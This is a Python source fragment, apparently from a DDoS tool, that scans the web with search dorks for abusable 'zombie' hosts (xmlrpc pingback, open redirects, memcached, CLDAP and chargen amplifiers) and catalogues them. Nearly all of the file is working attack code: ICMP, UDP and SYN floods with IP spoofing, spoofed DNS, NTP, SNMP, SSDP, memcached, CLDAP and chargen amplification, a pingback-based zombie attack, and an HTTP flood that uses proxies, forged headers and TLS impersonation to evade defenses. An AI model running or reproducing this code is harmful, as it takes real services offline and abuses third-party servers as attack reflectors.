        try:
            search_url = f"https://kagi.com/search?q={quote_plus(dork)}"
            response = requests.get(search_url, headers={'User-Agent': random.choice(self.user_agents)}, timeout=10)
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    if href.startswith('http') and 'kagi.com' not in href:
                        urls.append(href)
        except Exception as e:
            if hasattr(self, 'logger'):
                self.logger.debug(f"Kagi error: {e}")
        return urls

    def yahoo_search(self, session, dork):
        urls = []
        try:
            search_url = f"https://search.yahoo.com/search?p={quote_plus(dork)}&n=30"
            response = session.get(search_url, timeout=10)
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    if href.startswith('http') and 'yahoo.com' not in href and 'r.search.yahoo.com' not in href:
                        urls.append(href)
        except Exception as e:
            if hasattr(self, 'logger'):
                self.logger.debug(f"Yahoo error: {e}")
        return urls

    def validate_zombies(self, urls):
        valid_zombies = []
        print(f"{colorama.Fore.CYAN}[+] Validating {len(urls)} potential zombies...")
        progress = ProgressBar(len(urls), prefix='Validating:', suffix='Complete', length=30)
        with ThreadPoolExecutor(max_workers=30) as executor:
            future_to_url = {executor.submit(self.test_single_zombie, url): url for url in urls}
            for future in as_completed(future_to_url):
                url = future_to_url[future]
                try:
                    result = future.result()
                    if result:
                        valid_zombies.append(result)
                        print(f"{colorama.Fore.GREEN}[✓] Valid zombie: {result['url'][:50]}...")
                except Exception as e:
                    if hasattr(self, 'logger'):
                        self.logger.debug(f"Zombie validation error for {url}: {e}")
                progress.update()
        return valid_zombies

    def test_single_zombie(self, url):
        try:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            xmlrpc_url = urljoin(base_url, '/xmlrpc.php')
            if self.test_xmlrpc_pingback(xmlrpc_url):
                return self._create_zombie_result(xmlrpc_url, parsed, 'xmlrpc_pingback', 'web_abuse', 0.9)
            if self.test_open_redirect(url):
                return self._create_zombie_result(url, parsed, 'open_redirect', 'web_abuse', 0.8)
            if self.test_endpoint(url):
                return self._create_zombie_result(url, parsed, 'web_endpoint', 'http_flood', 0.7)
            try:
                ip = socket.gethostbyname(parsed.netloc)
                memcached_result = self.test_memcached_amplifier(ip)
                if memcached_result:
                    return memcached_result
                cldap_result = self.test_cldap_amplifier(ip)
                if cldap_result:
                    return cldap_result
                chargen_result = self.test_chargen_amplifier(ip)
                if chargen_result:
                    return chargen_result
            except:
                pass
        except Exception as e:
            if hasattr(self, 'logger'):
                self.logger.debug(f"Zombie test error for {url}: {e}")
        return None

    def _create_zombie_result(self, url, parsed, zombie_type, category, reliability):
        return {
            'url': url,
            'ip': self.resolve_ip(parsed.netloc),
            'type': zombie_type,
            'category': category,
            'status': 'active',
            'last_checked': datetime.now(),
            'response_time': 0,
            'exploit_method': zombie_type,
            'reliability_score': reliability
        }

    def test_xmlrpc_pingback(self, url):
        try:
            test_payload = """<?xml version="1.0"?>
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>"""
            headers = {'Content-Type': 'text/xml'}
            response = requests.post(url, data=test_payload, headers=headers, timeout=5)
            if response.status_code == 200 and 'pingback.ping' in response.text:
                pingback_payload = f"""<?xml version="1.0"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://0.0.0.0/</string></value></param>
<param><value><string>{url}</string></value></param>
</params>
</methodCall>"""
                ping_response = requests.post(url, data=pingback_payload, headers=headers, timeout=5)
                if ping_response.status_code in [200, 400, 500]:
                    return True
        except:
            pass
        return False

    def test_open_redirect(self, url):
        try:
            parsed = urlparse(url)
            query_params = parsed.query.split('&')
            redirect_params = ['url', 'redir', 'redirect', 'dest', 'destination', 'target']
            for param in query_params:
                if any(rp in param.lower() for rp in redirect_params):
                    return True
        except:
            pass
        return False

    def test_endpoint(self, url):
        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                return True
        except:
            pass
        return False

    def test_memcached_amplifier(self, ip):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)
            payload = b"\x00\x00\x00\x00\x01\x00\x00\x00stats\r\n"
            sock.sendto(payload, (ip, 11211))
            data, _ = sock.recvfrom(4096)
            if b"STAT" in data and len(data) > 100:
                return {
                    'url': f"memcached://{ip}:11211",
                    'ip': ip,
                    'type': 'memcached_amp',
                    'category': 'amplifier',
                    'status': 'active',
                    'last_checked': datetime.now(),
                    'response_time': 0,
                    'exploit_method': 'memcached_amp',
                    'reliability_score': 0.95,
                    'amplification_factor': len(data) / len(payload)
                }
        except:
            pass
        finally:
            sock.close()
        return None

    def test_cldap_amplifier(self, ip):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)
            payload = bytes.fromhex("3025020101632004000a01000a0100020100020100010100870b6f626a656374436c6173733000")
            sock.sendto(payload, (ip, 389))
            data, _ = sock.recvfrom(4096)
            if len(data) > 100:
                return {
                    'url': f"cldap://{ip}:389",
                    'ip': ip,
                    'type': 'cldap_amp',
                    'category': 'amplifier',
                    'status': 'active',
                    'last_checked': datetime.now(),
                    'response_time': 0,
                    'exploit_method': 'cldap_amp',
                    'reliability_score': 0.9,
                    'amplification_factor': len(data) / len(payload)
                }
        except:
            pass
        finally:
            sock.close()
        return None

    def test_chargen_amplifier(self, ip):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)
            payload = b"\x00"
            sock.sendto(payload, (ip, 19))
            data, _ = sock.recvfrom(4096)
            if len(data) > 50:
                return {
                    'url': f"chargen://{ip}:19",
                    'ip': ip,
                    'type': 'chargen_amp',
                    'category': 'amplifier',
                    'status': 'active',
                    'last_checked': datetime.now(),
                    'response_time': 0,
                    'exploit_method': 'chargen_amp',
                    'reliability_score': 0.85,
                    'amplification_factor': len(data) / len(payload)
                }
        except:
            pass
        finally:
            sock.close()
        return None

    def resolve_ip(self, hostname):
        try:
            return socket.gethostbyname(hostname)
        except:
            return 'Unknown'

    def save_scan_history(self, dork, engine, results_count):
        try:
            cursor = self.db_conn.cursor()
            cursor.execute('''
                INSERT INTO dork_scan_history (dork, engine, timestamp, results_count)
                VALUES (?, ?, ?, ?)
            ''', (dork, engine, datetime.now(), results_count))
            self.db_conn.commit()
        except Exception as e:
            if hasattr(self, 'logger'):
                self.logger.error(f"Error saving scan history: {e}")

    def save_zombies_to_db(self, zombies):
        try:
            cursor = self.db_conn.cursor()
            saved_count = 0
            for zombie in zombies:
                try:
                    cursor.execute('''
                        INSERT OR REPLACE INTO zombies
                        (url, ip, type, category, status, last_checked, response_time, exploit_method, reliability_score)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
                    ''', (
                        zombie['url'], zombie['ip'], zombie['type'], zombie['category'], zombie['status'],
                        zombie['last_checked'], zombie['response_time'], zombie['exploit_method'], zombie['reliability_score']
                    ))
                    saved_count += 1
                except Exception as e:
                    if hasattr(self, 'logger'):
                        self.logger.error(f"Error saving zombie {zombie['url']}: {e}")
            self.db_conn.commit()
            print(f"{colorama.Fore.GREEN}[+] Saved {saved_count} zombies to database")
        except Exception as e:
            if hasattr(self, 'logger'):
                self.logger.error(f"Error saving zombies to database: {e}")

    def test_zombie_network(self):
        print(f"{colorama.Fore.CYAN}[+] Testing zombie network...")
        try:
            cursor = self.db_conn.cursor()
            cursor.execute('SELECT url, type, exploit_method FROM zombies WHERE status IN ("active", "slow", "intermittent")')
            zombies = cursor.fetchall()
            if not zombies:
                print(f"{colorama.Fore.YELLOW}[!] No active zombies found")
                return
            print(f"{colorama.Fore.WHITE}[+] Testing {len(zombies)} zombies...")
            working_zombies = []
            progress = ProgressBar(len(zombies), prefix='Testing:', suffix='Complete', length=30)
            with ThreadPoolExecutor(max_workers=20) as executor:
                future_to_zombie = {executor.submit(self.test_zombie_connection, z[0]): z for z in zombies}
                for future in as_completed(future_to_zombie):
                    zombie = future_to_zombie[future]
                    try:
                        is_working = future.result()
                        if is_working:
                            working_zombies.append(zombie)
                            print(f"{colorama.Fore.GREEN}[✓] Working: {zombie[0][:50]}...")
                        else:
                            print(f"{colorama.Fore.RED}[✗] Offline: {zombie[0][:50]}...")
                    except Exception as e:
                        if hasattr(self, 'logger'):
                            self.logger.debug(f"Zombie test error: {e}")
                    progress.update()
            print(f"\n{colorama.Fore.GREEN}[+] Working zombies: {len(working_zombies)}/{len(zombies)}")
            for zombie in zombies:
                status = 'active' if zombie in working_zombies else 'offline'
                cursor.execute('UPDATE zombies SET status = ?, last_checked = ? WHERE url = ?', (status, datetime.now(), zombie[0]))
            self.db_conn.commit()
        except Exception as e:
            print(f"{colorama.Fore.RED}[!] Error testing zombie network: {e}")
            if hasattr(self, 'logger'):
                self.logger.error(f"Zombie network test error: {e}")

    def test_zombie_connection(self, url):
        try:
            response = requests.get(url, timeout=5)
            return response.status_code == 200
        except:
            return False

    def view_zombie_database(self):
        try:
            cursor = self.db_conn.cursor()
            cursor.execute('SELECT * FROM zombies ORDER BY last_checked DESC LIMIT 50')
            zombies = cursor.fetchall()
            if not zombies:
                print(f"{colorama.Fore.YELLOW}[!] No zombies in database")
                return
            print(f"{colorama.Fore.CYAN}[+] Zombie Database (Last 50):")
            print(f"{'ID':<5} {'Type':<15} {'Category':<12} {'Status':<12} {'Reliability':<12} {'URL':<30}")
            print("-" * 90)
            for zombie in zombies:
                zombie_id, url, ip, zombie_type, category, status, last_checked, response_time, exploit_method, reliability = zombie
                print(f"{zombie_id:<5} {zombie_type[:14]:<15} {category[:11]:<12} {status[:11]:<12} {reliability:<12.2f} {url[:29]:<30}")
        except Exception as e:
            print(f"{colorama.Fore.RED}[!] Error viewing zombie database: {e}")

    def export_zombies(self):
        try:
            cursor = self.db_conn.cursor()
            cursor.execute('SELECT url, type, category, reliability_score, ip FROM zombies WHERE status = "active"')
            zombies = cursor.fetchall()
            if not zombies:
                print(f"{colorama.Fore.YELLOW}[!] No active zombies to export")
                return
            enriched_zombies = []
            for url, zombie_type, category, reliability, ip in zombies:
                enrichment = self.enrich_zombie_with_shodan(ip) if ip != 'Unknown' else {}
                enriched_zombies.append({
                    'url': url,
                    'type': zombie_type,
                    'category': category,
                    'reliability': reliability,
                    'ip': ip,
                    'org': enrichment.get('org', ''),
                    'isp': enrichment.get('isp', ''),
                    'ports': enrichment.get('ports', [])
                })
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            with open(f"zombies_{timestamp}.json", 'w') as f:
                json.dump(enriched_zombies, f, indent=2)
            with open(f"zombies_{timestamp}.csv", 'w') as f:
                f.write("URL,Type,Category,Reliability,IP,Org,ISP,Ports\n")
                for z in enriched_zombies:
                    ports_str = ';'.join(map(str, z['ports'])) if z['ports'] else ''
                    f.write(f"{z['url']},{z['type']},{z['category']},{z['reliability']},{z['ip']},{z['org']},{z['isp']},{ports_str}\n")
            print(f"{colorama.Fore.GREEN}[+] Exported {len(zombies)} zombies to JSON and CSV")
        except Exception as e:
            print(f"{colorama.Fore.RED}[!] Error exporting zombies: {e}")

    def enrich_zombie_with_shodan(self, ip):
        if not HAS_SHODAN:
            return {}
        try:
            api = shodan.Shodan(os.getenv('SHODAN_API_KEY', ''))
            host = api.host(ip)
            return {
                'org': host.get('org', ''),
                'isp': host.get('isp', ''),
                'ports': [p['port'] for p in host.get('ports', [])]
            }
        except:
            return {}

    def purge_offline_zombies(self):
        try:
            cursor = self.db_conn.cursor()
            cursor.execute('DELETE FROM zombies WHERE status = "offline"')
            deleted_count = cursor.rowcount
            self.db_conn.commit()
            print(f"{colorama.Fore.GREEN}[+] Purged {deleted_count} offline zombies from database")
        except Exception as e:
            print(f"{colorama.Fore.RED}[!] Error purging offline zombies: {e}")

    def zombie_scanner_menu(self):
        while True:
            self.clear_screen()
            self.print_logo()
            print(f"{colorama.Fore.CYAN}=== ZOMBIE SCANNER MENU ===")
            print(f"{colorama.Fore.WHITE}[1] Scan for Zombies (Dork-based)")
            print(f"[2] Test Zombie Network")
            print(f"[3] View Zombie Database")
            print(f"[4] Export Zombies")
            print(f"[5] Purge Offline Zombies")
            print(f"[6] Back to Main Menu")
            print(f"{colorama.Fore.CYAN}==========================")
            choice = input(f"{colorama.Fore.GREEN}Select option: ").strip()
            if choice == "1":
                self.scan_for_zombies()
            elif choice == "2":
                self.test_zombie_network()
            elif choice == "3":
                self.view_zombie_database()
            elif choice == "4":
                self.export_zombies()
            elif choice == "5":
                self.purge_offline_zombies()
            elif choice == "6":
                break
            else:
                print(f"{colorama.Fore.RED}[!] Invalid option")
                time.sleep(1)

    # --- Attack Configuration & Menu ---
    def get_attack_options(self):
        try:
            print(f"{colorama.Fore.CYAN}=== ATTACK CONFIGURATION ===")
            target_input = input(f"{colorama.Fore.WHITE}Target IP/Domain/URL: ").strip()
            if not target_input.startswith(('http://', 'https://')):
                target_input = 'http://' + target_input
            target_parsed = urlparse(target_input)
            ip_or_domain = target_parsed.netloc.split(':')[0]
            port = target_parsed.port or (443 if target_parsed.scheme == 'https' else 80)
            
            print(f"\n{colorama.Fore.CYAN}=== ATTACK INTENSITY ===")
            bytes_per_sec = int(input("Bytes Per Second (0 for max): ") or "0") or 10000
            threads = int(input("Number of Threads: ") or "100") or 100
            duration = int(input("Attack Duration (seconds, 0=unlimited): ") or "60")

            print(f"\n{colorama.Fore.CYAN}=== ADVANCED OPTIONS ===")
            use_proxies = input("Use Proxy Rotation? (Y/N): ").lower() == 'y'
            use_spoofing = input("Use IP Spoofing for L3/L4? (Y/N): ").lower() == 'y'

            print(f"\n{colorama.Fore.CYAN}=== ATTACK VECTORS ===")
            print(f"{colorama.Fore.WHITE}[1] All Vectors")
            print(f"[2] HTTP Flood")
            print(f"[3] UDP Flood")
            print(f"[4] TCP SYN Flood")
            print(f"[5] ICMP Flood (Ping)")
            print(f"[6] DNS Amplification")
            print(f"[7] NTP Amplification")
            print(f"[8] SNMP Amplification")
            print(f"[9] SSDP Amplification")
            print(f"[10] Memcached Amplification")
            print(f"[11] CLDAP Amplification")
            print(f"[12] Chargen Amplification")
            print(f"[13] Zombie Network Attack")
            attack_choice = int(input("Select Attack Vector: ") or "1")
            attack_type_map = {
                1: "all", 2: "http", 3: "udp", 4: "syn", 5: "icmp",
                6: "dns_amp", 7: "ntp_amp", 8: "snmp_amp", 9: "ssdp_amp",
                10: "memcached_amp", 11: "cldap_amp", 12: "chargen_amp", 13: "zombie"
            }
            attack_type = attack_type_map.get(attack_choice, "all")
            save_attack = input("Save Attack Data? (Y/N): ").lower() == 'y'
            return ip_or_domain, port, bytes_per_sec, threads, duration, use_proxies, attack_type, save_attack, target_input, use_spoofing
        except KeyboardInterrupt:
            print(f"\n{colorama.Fore.YELLOW}[!] Attack cancelled by user.")
            return None
        except Exception as e:
            print(f"{colorama.Fore.RED}[!] Invalid input: {e}")
            return None

    def print_attack_status(self, target, port, bytes_per_sec, threads, duration, use_proxies, attack_type, save_attack):
        print(f"\n{colorama.Fore.LIGHTRED_EX}=== ATTACK INITIATED ===")
        print(f"{colorama.Fore.LIGHTWHITE_EX}TARGET INFORMATION:")
        print(f"+------------------------+")
        print(f"¦ Target    : {target}")
        print(f"¦ Port      : {port}")
        print(f"¦ BPS       : {bytes_per_sec}")
        print(f"¦ Threads   : {threads}")
        print(f"¦ Duration  : {duration if duration > 0 else 'Unlimited'}s")
        print(f"¦ Proxies   : {use_proxies}")
        print(f"¦ Vector    : {attack_type}")
        print(f"¦ Save Data : {save_attack}")
        print(f"¦ OS        : {platform.system()}")
        print(f"¦ Proxies   : {len(self.proxies)} loaded")
        print(f"¦ UAs       : {len(self.user_agents)} loaded")
        print(f"+------------------------+")
        if hasattr(self, 'logger'):
            self.logger.info(f"Attack initiated: {target}:{port}, Threads: {threads}, Duration: {duration}")

    # --- Attack Implementations ---
    def icmp_flood(self, target, bytes_per_sec, duration):
        print(f"{colorama.Fore.CYAN}[+] Starting ICMP Flood against {target}")
        end_time = time.time() + (duration if duration > 0 else 86400)
        packet_count = 0
        try:
            while time.time() < end_time and self.attack_running:
                try:
                    packet = IP(dst=target) / ICMP() / Raw(load=secrets.token_bytes(random.randint(64, 1024)))
                    send(packet, verbose=0)
                    packet_count += 1
                    self.attack_stats['packets_sent'] += 1
                    self.attack_stats['bytes_sent'] += len(packet)
                    self.attack_module_stats['icmp_flood'] += 1
                    if bytes_per_sec > 0:
                        time.sleep(len(packet) / bytes_per_sec)
                except Exception as e:
                    if hasattr(self, 'logger'):
                        self.logger.debug(f"ICMP flood error: {e}")
                    time.sleep(0.001)
        except Exception as e:
            print(f"{colorama.Fore.RED}[!] ICMP Flood error: {e}")
        finally:
            print(f"{colorama.Fore.GREEN}[✓] ICMP Flood completed. Packets sent: {packet_count}")

    def udp_flood(self, target, port, bytes_per_sec, duration, use_spoofing=False):
        print(f"{colorama.Fore.CYAN}[+] Starting UDP Flood against {target}:{port} (Spoofing: {use_spoofing})")
        end_time = time.time() + (duration if duration > 0 else 86400)
        packet_count = 0
        try:
            while time.time() < end_time and self.attack_running:
                for _ in range(min(100, bytes_per_sec // 100)):
                    payload = secrets.token_bytes(random.randint(256, 1400))
                    src_ip = random.choice(self.fake_ips) if use_spoofing else None
                    packet = IP(src=src_ip, dst=target) / UDP(sport=random.randint(1024, 65535), dport=port) / Raw(load=payload)
                    send(packet, verbose=0)
                    packet_count += 1
                    self.attack_stats['packets_sent'] += 1
                    self.attack_stats['bytes_sent'] += len(payload)
                    self.attack_module_stats['udp_flood'] += 1
                if bytes_per_sec > 0:
                    time.sleep(0.001)
                else:
                    time.sleep(0.0001)
        except Exception as e:
            print(f"{colorama.Fore.RED}[!] UDP Flood error: {e}")
        finally:
            print(f"{colorama.Fore.GREEN}[✓] UDP Flood completed. Packets sent: {packet_count}")

    def syn_flood(self, target, port, bytes_per_sec, duration, use_spoofing=False):
        print(f"{colorama.Fore.CYAN}[+] Starting TCP SYN Flood against {target}:{port} (Spoofing: {use_spoofing})")
        end_time = time.time() + (duration if duration > 0 else 86400)
        packet_count = 0
        try:
            while time.time() < end_time and self.attack_running:
                for _ in range(min(50, bytes_per_sec // 200)):
                    src_port = random.randint(1024, 65535)
                    src_ip = random.choice(self.fake_ips) if use_spoofing else None
                    packet = IP(src=src_ip, dst=target) / TCP(sport=src_port, dport=port, flags="S")
                    send(packet, verbose=0)
                    packet_count += 1
                    self.attack_stats['packets_sent'] += 1
                    self.attack_module_stats['syn_flood'] += 1
                if bytes_per_sec > 0:
                    time.sleep(0.01)
                else:
                    time.sleep(0.001)
        except Exception as e:
            print(f"{colorama.Fore.RED}[!] SYN Flood error: {e}")
        finally:
            print(f"{colorama.Fore.GREEN}[✓] SYN Flood completed. Packets sent: {packet_count}")

    def dns_amplification(self, target, duration):
        print(f"{colorama.Fore.CYAN}[+] Starting DNS Amplification against {target}")
        dns_servers = ["8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222"]
        end_time = time.time() + (duration if duration > 0 else 86400)
        packet_count = 0
        try:
            while time.time() < end_time and self.attack_running:
                for dns_server in dns_servers:
                    domain = f"{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))}.com"
                    dns_query = IP(dst=dns_server, src=target) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=domain, qtype="ANY"))
                    send(dns_query, verbose=0)
                    packet_count += 1
                    self.attack_module_stats['dns_amp'] += 1
                time.sleep(0.01)
        except Exception as e:
            print(f"{colorama.Fore.RED}[!] DNS Amplification error: {e}")
        finally:
            print(f"{colorama.Fore.GREEN}[✓] DNS Amplification completed. Packets sent: {packet_count}")

    def ntp_amplification(self, target, duration):
        print(f"{colorama.Fore.CYAN}[+] Starting NTP Amplification against {target}")
        ntp_servers = ["129.6.15.28", "132.163.96.1", "193.190.230.66"]
        end_time = time.time() + (duration if duration > 0 else 86400)
        packet_count = 0
        try:
            while time.time() < end_time and self.attack_running:
                for ntp_server in ntp_servers:
                    ntp_payload = b"\x17" + b"\x00\x03" + b"\x2a" + b"\x00" * 4
                    packet = IP(dst=ntp_server, src=target) / UDP(dport=123) / Raw(load=ntp_payload)
                    send(packet, verbose=0)
                    packet_count += 1
                    self.attack_module_stats['ntp_amp'] += 1
                time.sleep(0.01)
        except Exception as e:
            print(f"{colorama.Fore.RED}[!] NTP Amplification error: {e}")
        finally:
            print(f"{colorama.Fore.GREEN}[✓] NTP Amplification completed. Packets sent: {packet_count}")

    def snmp_amplification(self, target, duration):
        print(f"{colorama.Fore.CYAN}[+] Starting SNMP Amplification against {target}")
        snmp_servers = ["128.138.127.29", "192.5.44.10", "192.12.22.1"]
        end_time = time.time() + (duration if duration > 0 else 86400)
        packet_count = 0
        try:
            while time.time() < end_time and self.attack_running:
                for snmp_server in snmp_servers:
                    snmp_payload = b"\x30\x82\x00\x32\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x82\x00\x23\x02\x04\x00\x00\x00\x01\x02\x01\x00\x02\x01\x00\x30\x82\x00\x12\x30\x82\x00\x0e\x06\x0a\x2b\x06\x01\x02\x01\x01\x01\x00\x05\x00"
                    packet = IP(dst=snmp_server, src=target) / UDP(dport=161) / Raw(load=snmp_payload)
                    send(packet, verbose=0)
                    packet_count += 1
                    self.attack_module_stats['snmp_amp'] += 1
                time.sleep(0.01)
        except Exception as e:
            print(f"{colorama.Fore.RED}[!] SNMP Amplification error: {e}")
        finally:
            print(f"{colorama.Fore.GREEN}[✓] SNMP Amplification completed. Packets sent: {packet_count}")

    def ssdp_amplification(self, target, duration):
        print(f"{colorama.Fore.CYAN}[+] Starting SSDP Amplification against {target}")
        ssdp_endpoints = ["239.255.255.250"]
        end_time = time.time() + (duration if duration > 0 else 86400)
        packet_count = 0
        try:
            while time.time() < end_time and self.attack_running:
                for ssdp_endpoint in ssdp_endpoints:
                    ssdp_request = (
                        "M-SEARCH * HTTP/1.1\r\n"
                        "HOST: 239.255.255.250:1900\r\n"
                        "MAN: \"ssdp:discover\"\r\n"
                        "MX: 2\r\n"
                        "ST: ssdp:all\r\n"
                        "USER-AGENT: SilverWolf/1.0\r\n\r\n"
                    ).encode()
                    packet = IP(dst=ssdp_endpoint, src=target) / UDP(dport=1900) / Raw(load=ssdp_request)
                    send(packet, verbose=0)
                    packet_count += 1
                    self.attack_module_stats['ssdp_amp'] += 1
                time.sleep(0.01)
        except Exception as e:
            print(f"{colorama.Fore.RED}[!] SSDP Amplification error: {e}")
        finally:
            print(f"{colorama.Fore.GREEN}[✓] SSDP Amplification completed. Packets sent: {packet_count}")

    def memcached_amplification(self, target, duration):
        print(f"{colorama.Fore.CYAN}[+] Starting Memcached Amplification against {target}")
        cursor = self.db_conn.cursor()
        cursor.execute('SELECT ip FROM zombies WHERE type = "memcached_amp" AND status = "active" LIMIT 50')
        memcached_servers = [row[0] for row in cursor.fetchall()]
        if not memcached_servers:
            print(f"{colorama.Fore.YELLOW}[!] No active Memcached zombies found")
            return
        end_time = time.time() + (duration if duration > 0 else 86400)
        packet_count = 0
        try:
            while time.time() < end_time and self.attack_running:
                for server_ip in memcached_servers:
                    payload = b"\x00\x00\x00\x00\x01\x00\x00\x00get key\r\n"
                    packet = IP(dst=server_ip, src=target) / UDP(dport=11211) / Raw(load=payload)
                    send(packet, verbose=0)
                    packet_count += 1
                    self.attack_module_stats['memcached_amp'] += 1
                time.sleep(0.01)
        except Exception as e:
            print(f"{colorama.Fore.RED}[!] Memcached Amplification error: {e}")
        finally:
            print(f"{colorama.Fore.GREEN}[✓] Memcached Amplification completed. Packets sent: {packet_count}")

    def cldap_amplification(self, target, duration):
        print(f"{colorama.Fore.CYAN}[+] Starting CLDAP Amplification against {target}")
        cursor = self.db_conn.cursor()
        cursor.execute('SELECT ip FROM zombies WHERE type = "cldap_amp" AND status = "active" LIMIT 50')
        cldap_servers = [row[0] for row in cursor.fetchall()]
        if not cldap_servers:
            print(f"{colorama.Fore.YELLOW}[!] No active CLDAP zombies found")
            return
        end_time = time.time() + (duration if duration > 0 else 86400)
        packet_count = 0
        try:
            while time.time() < end_time and self.attack_running:
                for server_ip in cldap_servers:
                    payload = bytes.fromhex("3025020101632004000a01000a0100020100020100010100870b6f626a656374436c6173733000")
                    packet = IP(dst=server_ip, src=target) / UDP(dport=389) / Raw(load=payload)
                    send(packet, verbose=0)
                    packet_count += 1
                    self.attack_module_stats['cldap_amp'] += 1
                time.sleep(0.01)
        except Exception as e:
            print(f"{colorama.Fore.RED}[!] CLDAP Amplification error: {e}")
        finally:
            print(f"{colorama.Fore.GREEN}[✓] CLDAP Amplification completed. Packets sent: {packet_count}")

    def chargen_amplification(self, target, duration):
        print(f"{colorama.Fore.CYAN}[+] Starting Chargen Amplification against {target}")
        cursor = self.db_conn.cursor()
        cursor.execute('SELECT ip FROM zombies WHERE type = "chargen_amp" AND status = "active" LIMIT 50')
        chargen_servers = [row[0] for row in cursor.fetchall()]
        if not chargen_servers:
            print(f"{colorama.Fore.YELLOW}[!] No active Chargen zombies found")
            return
        end_time = time.time() + (duration if duration > 0 else 86400)
        packet_count = 0
        try:
            while time.time() < end_time and self.attack_running:
                for server_ip in chargen_servers:
                    payload = b"\x00"
                    packet = IP(dst=server_ip, src=target) / UDP(dport=19) / Raw(load=payload)
                    send(packet, verbose=0)
                    packet_count += 1
                    self.attack_module_stats['chargen_amp'] += 1
                time.sleep(0.01)
        except Exception as e:
            print(f"{colorama.Fore.RED}[!] Chargen Amplification error: {e}")
        finally:
            print(f"{colorama.Fore.GREEN}[✓] Chargen Amplification completed. Packets sent: {packet_count}")

    def zombie_network_attack(self, target_url, duration):
        print(f"{colorama.Fore.CYAN}[+] Starting Zombie Network Attack against {target_url}")
        cursor = self.db_conn.cursor()
        cursor.execute('SELECT url, type, exploit_method FROM zombies WHERE status = "active"')
        zombies = cursor.fetchall()
        if not zombies:
            print(f"{colorama.Fore.YELLOW}[!] No active zombies available")
            return
        print(f"{colorama.Fore.WHITE}[+] Using {len(zombies)} zombies for attack")
        end_time = time.time() + (duration if duration > 0 else 86400)
        attack_count = 0
        while time.time() < end_time and self.attack_running:
            for zombie_url, zombie_type, exploit_method in zombies:
                if not self.attack_running:
                    break
                try:
                    if zombie_type == 'xmlrpc_pingback':
                        self.send_pingback_request(zombie_url, target_url)
                        self.attack_module_stats['zombie_pingback'] += 1
                    elif zombie_type == 'open_redirect':
                        self.send_open_redirect_request(zombie_url, target_url)
                        self.attack_module_stats['zombie_redirect'] += 1
                    else:
                        self.send_generic_zombie_request(zombie_url, target_url)
                        self.attack_module_stats['zombie_generic'] += 1
                    attack_count += 1
                    self.attack_stats['requests_sent'] += 1
                except Exception as e:
                    if hasattr(self, 'logger'):
                        self.logger.debug(f"Zombie attack error: {e}")
            time.sleep(0.001)
        print(f"{colorama.Fore.GREEN}[✓] Zombie attack completed. Total attacks: {attack_count}")

    def send_pingback_request(self, zombie_xmlrpc, target):
        try:
            client = xmlrpc.client.ServerProxy(zombie_xmlrpc)
            fake_source = f"http://{secrets.token_hex(8)}.com/fake-post"
            client.pingback.ping(fake_source, target)
        except:
            pass

    def send_open_redirect_request(self, zombie_url, target):
        try:
            requests.get(zombie_url, timeout=3)
        except:
            pass

    def send_generic_zombie_request(self, zombie_url, target):
        try:
            requests.get(zombie_url, timeout=3)
        except:
            pass

    # --- HTTP Flood with Evasion ---
    async def run_async_http_attacks(self, target, port, threads, use_proxies, duration):
        print(f"{colorama.Fore.CYAN}[+] Starting Async HTTP Flood...")
        timeout = aiohttp.ClientTimeout(total=5, connect=2)
        connector = aiohttp.TCPConnector(
            limit=500,
            limit_per_host=50,
            ttl_dns_cache=300,
            keepalive_timeout=15,
            enable_cleanup_closed=True,
            force_close=False
        )
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            tasks = []
            for _ in range(max(1, threads)):
                task = asyncio.create_task(self.async_http_flood_worker(session, target, port, use_proxies, duration))
                tasks.append(task)
            try:
                if duration > 0:
                    await asyncio.wait_for(asyncio.gather(*tasks), timeout=duration)
                else:
                    await asyncio.gather(*tasks)
            except asyncio.TimeoutError:
                pass
            except Exception as e:
                if hasattr(self, 'logger'):
                    self.logger.error(f"Async HTTP worker error: {e}")

    async def async_http_flood_worker(self, session, target, port, use_proxies, duration):
        end_time = time.time() + (duration if duration > 0 else 86400)
        while time.time() < end_time and self.attack_running:
            try:
                fake_ip = random.choice(self.fake_ips)
                user_agent = random.choice(self.user_agents)
                url = f"http://{target}:{port}"
                headers = {
                    "Host": fake_ip,
                    "User-Agent": user_agent,
                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                    "Via": f"1.1 {fake_ip}",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "keep-alive",
                    "Cache-Control": "no-cache"
                }
                proxy = f"http://{random.choice(self.proxies)}" if use_proxies and self.proxies else None
                cache_buster = f"?_={int(time.time()*1000)}&r={secrets.token_hex(16)}"

                # Use curl_cffi for browser-like TLS fingerprint
                if HAS_IMPERSONATE:
                    with ImpersonatedSession() as imp_session:
                        imp_session.get(url + cache_buster, headers=headers, proxies={"http": proxy, "https": proxy} if proxy else None)
                else:
                    # Fallback to regular requests
                    requests.get(url + cache_buster, headers=headers, proxies={"http": proxy, "https": proxy} if proxy else None)

                self.attack_stats['requests_sent'] += 1
                self.attack_module_stats['http_flood'] += 1

            except Exception as e:
                if "Cannot connect to host" not in str(e):
                    if hasattr(self, 'logger'):
                        self.logger.debug(f"HTTP flood error: {e}")
                time.sleep(0.1)

    # --- Main Orchestrator ---
